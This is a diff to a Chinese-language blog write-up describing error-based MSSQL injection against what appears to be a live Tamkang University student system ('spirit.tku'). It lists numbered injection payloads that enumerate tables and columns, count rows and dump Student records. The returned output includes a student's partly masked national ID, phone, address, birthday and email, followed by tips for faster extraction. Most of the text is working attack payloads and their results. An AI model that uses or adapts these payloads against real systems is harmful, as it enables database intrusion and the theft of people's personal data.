@@ -1,6 +1,8 @@
 ---
 title: SQL Injection spirit.tku
 description: SQL Injection spirit.tku
+last_update:
+  date: "2025-08-29T08:00:00+08:00"
 ---
 
 ## 前言
@@ -133,11 +135,36 @@ from Company A
 
 6. `' AND 1 = CONVERT(int,(SELECT table_name FROM information_schema.tables FOR XML PATH('')))--`
 
+```xml
+<table_name>Variables</table_name>
+<table_name>College</table_name>
+<table_name>Student</table_name>
+<table_name>Type</table_name>
+<table_name>City</table_name>
+<table_name>Send</table_name>
+<table_name>Welfare</table_name>
+<table_name>Company</table_name>
+<table_name>News</table_name>
+<table_name>CompanyCity</table_name>
+<table_name>CompanyWelfare</table_name>
+<table_name>Job</table_name>
+<table_name>JobType</table_name>
+<table_name>JobCity</table_name>
+<table_name>CompanyFromSIS</table_name>
+<table_name>Status</table_name>
+<table_name>StudentStatus</table_name>
+<table_name>StudentCity</table_name>
+<table_name>BookmarkJob</table_name>
+<table_name>BookmarkCompany</table_name>
 ```
 
+7. `' AND 1 = CONVERT(int,(SELECT COUNT(*) + 'hello' FROM information_schema.columns WHERE table_name = 'Student' FOR XML PATH('')))--`
+
+```xml
+<hello>74</hello>
 ```
 
-7. `' AND 1 = CONVERT(int,(SELECT column_name FROM information_schema.columns WHERE table_name = 'Student' FOR XML PATH('')))--`
+8. `' AND 1 = CONVERT(int,(SELECT column_name FROM information_schema.columns WHERE table_name = 'Student' FOR XML PATH('')))--`
 
 ```xml
 <column_name>Id</column_name>
@@ -218,4 +245,61 @@ from Company A
 
 資料會被截斷，測起來是 400 多字元，就抓一次 440 個，取到 2598 的時候剛好結束
 
-8. `' AND 1 = CONVERT(int,(SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'Student' FOR XML PATH('')),1,457)))--`
+8. `' AND 1 = CONVERT(int,(SELECT SUBSTRING((SELECT column_name as cn FROM information_schema.columns WHERE table_name = 'Student' FOR XML PATH('')),1,440)))--`
+
+```xml
+<cn>Code</cn>
+```
+
+發現用 `SELECT column_name as cn` 就可以大幅減少重複的 TAG Name，增加提取的效率
+
+9. `' AND 1 = CONVERT(int,(SELECT COUNT(*) + 'hello' FROM Student FOR XML PATH('')))--`
+
+```xml
+<hello>2155</hello>
+```
+
+10. `' AND 1 = CONVERT(int,(SELECT SUBSTRING((SELECT * FROM Student FOR XML PATH('')),1,440)))--`
+
+```xml
+<Id>7</Id>
+<Code>40*******</Code>
+<Name>孫**</Name>
+<YS>1***</YS>
+<College>**語文學院</College>
+<Department>**語文學系（日）</Department>
+<Class>**四</Class>
+<ClassCode>T***** </ClassCode>
+<Role>學生</Role>
+<IsAlumnus>0</IsAlumnus>
+<IsGraduate>0</IsGraduate>
+<IsNight>0</IsNight>
+<Gender>女</Gender>
+<Birthday>1998-**-**T00:00:00</Birthday>
+<PID>A2********</PID>
+<Phone>02-26******</Phone>
+<Address>221 新北市汐止區*****巷*弄*號*樓</Address>
+<Mail>40*******@***.tku.edu.tw</Mail>
+<SchoolType>大專院校</SchoolType>
+<SchoolStatus>在學</SchoolStatus>
+<SchoolName>淡江大學</SchoolName>
+<SchoolDepartment>**語文學系（日）</SchoolDepartment>
+<CreateTime>2020-04-01T18:00:37</CreateTime>
+<ModifyTime>2020-05-07T16:40:16</ModifyTime>
+<LoginTime>2020-05-07T16:40:16</LoginTime>
+<LoginCount>2</LoginCount>
+```
+
+## 學到的東西
+
+1. 如果 SELECT 的是數字，後面要加一個字串，才可以成功引出 Error Message
+
+```sql
+SELECT COUNT(*) + 'hello' FROM Student FOR XML PATH('')
+```
+
+2. 用 as 別名，可以大幅減少重複的 XML Tag 長度，提升讀取資料的效率
+
+```sql
+SELECT table_name as tn FROM information_schema.tables FOR XML PATH('')
+```
